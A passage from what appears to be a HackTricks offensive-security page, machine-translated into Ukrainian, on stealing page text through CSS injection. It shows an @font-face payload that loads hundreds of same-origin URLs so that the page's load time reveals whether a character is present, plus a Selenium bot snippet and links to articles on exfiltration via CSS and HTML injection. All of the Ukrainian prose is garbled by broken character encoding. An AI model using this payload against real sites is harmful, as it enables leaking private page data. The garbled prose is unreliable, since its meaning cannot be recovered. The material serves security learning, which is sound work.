
–£ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∫–∞–∑–∞—Ç–∏ **CSS –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Å–æ—Ç–µ–Ω—å —Ñ–∞–ª—å—à–∏–≤–∏—Ö —à—Ä–∏—Ñ—Ç—ñ–≤** –∑ —Ç–æ–≥–æ –∂ –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è, –∫–æ–ª–∏ –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è –∑–±—ñ–≥. –¢–∞–∫–∏–º —á–∏–Ω–æ–º, –≤–∏ –º–æ–∂–µ—Ç–µ **–≤–∏–º—ñ—Ä—è—Ç–∏ —á–∞—Å**, —è–∫–∏–π —Ü–µ –∑–∞–π–º–∞—î, —ñ –¥—ñ–∑–Ω–∞—Ç–∏—Å—è, —á–∏ –∑'—è–≤–ª—è—î—Ç—å—Å—è —Å–∏–º–≤–æ–ª, —á–∏ –Ω—ñ, –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —á–æ–≥–æ—Å—å –Ω–∞ –∫—à—Ç–∞–ª—Ç:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1),
url(/static/bootstrap.min.css?q=2),
....
url(/static/bootstrap.min.css?q=500);
unicode-range: U+0041;
}
```
–ê –∫–æ–¥ –±–æ—Ç–∞ –≤–∏–≥–ª—è–¥–∞—î —Ç–∞–∫:
```python
browser.get(url)
WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete')
time.sleep(30)
```
–û—Ç–∂–µ, —è–∫—â–æ —à—Ä–∏—Ñ—Ç –Ω–µ –∑–±—ñ–≥–∞—î—Ç—å—Å—è, —á–∞—Å –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –ø—Ä–∏ –≤—ñ–¥–≤—ñ–¥—É–≤–∞–Ω–Ω—ñ –±–æ—Ç–∞ –æ—á—ñ–∫—É—î—Ç—å—Å—è –ø—Ä–∏–±–ª–∏–∑–Ω–æ 30 —Å–µ–∫—É–Ω–¥. –û–¥–Ω–∞–∫, —è–∫—â–æ —î –∑–±—ñ–≥ —à—Ä–∏—Ñ—Ç—ñ–≤, –±—É–¥–µ –Ω–∞–¥—ñ—Å–ª–∞–Ω–æ –∫—ñ–ª—å–∫–∞ –∑–∞–ø–∏—Ç—ñ–≤ –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è —à—Ä–∏—Ñ—Ç—É, —â–æ –ø—Ä–∏–∑–≤–µ–¥–µ –¥–æ –ø–æ—Å—Ç—ñ–π–Ω–æ—ó –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—ñ –≤ –º–µ—Ä–µ–∂—ñ. –Ø–∫ –Ω–∞—Å–ª—ñ–¥–æ–∫, –∑–Ω–∞–¥–æ–±–∏—Ç—å—Å—è –±—ñ–ª—å—à–µ —á–∞—Å—É –¥–ª—è –∑–∞–¥–æ–≤–æ–ª–µ–Ω–Ω—è —É–º–æ–≤–∏ –∑—É–ø–∏–Ω–∫–∏ —Ç–∞ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ. –¢–æ–º—É —á–∞—Å –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —è–∫ —ñ–Ω–¥–∏–∫–∞—Ç–æ—Ä –¥–ª—è –≤–∏–∑–Ω–∞—á–µ–Ω–Ω—è, —á–∏ —î –∑–±—ñ–≥ —à—Ä–∏—Ñ—Ç—ñ–≤.

## References

* [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)
* [https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)
* [https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d](https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d)
* [https://x-c3ll.github.io/posts/CSS-Injection-Primitives/](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
